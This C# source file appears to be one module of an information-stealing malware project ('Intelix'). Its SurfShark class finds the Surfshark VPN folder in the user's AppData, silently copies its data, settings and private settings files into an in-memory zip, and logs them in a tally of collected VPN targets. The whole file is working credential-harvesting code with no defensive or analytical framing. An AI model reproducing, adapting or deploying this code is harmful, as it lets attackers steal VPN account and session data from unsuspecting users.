using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class SurfShark : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Surfshark");
		if (!Directory.Exists(text))
		{
			return;
		}
		Counter.CounterApplications counterApplications = new Counter.CounterApplications();
		counterApplications.Name = "Surfshark";
		string[] array = new string[4] { "data.dat", "settings.dat", "settings-log.dat", "private_settings.dat" };
		foreach (string path in array)
		{
			try
			{
				string path2 = Path.Combine(text, path);
				if (File.Exists(path2))
				{
					zip.AddFile(Path.Combine("Surfshark", path), File.ReadAllBytes(path2));
				}
			}
			catch
			{
			}
		}
		counterApplications.Files.Add(text + " => Surfshark");
		counterApplications.Files.Add("Surfshark\\");
		counter.Vpns.Add(counterApplications);
	}
}
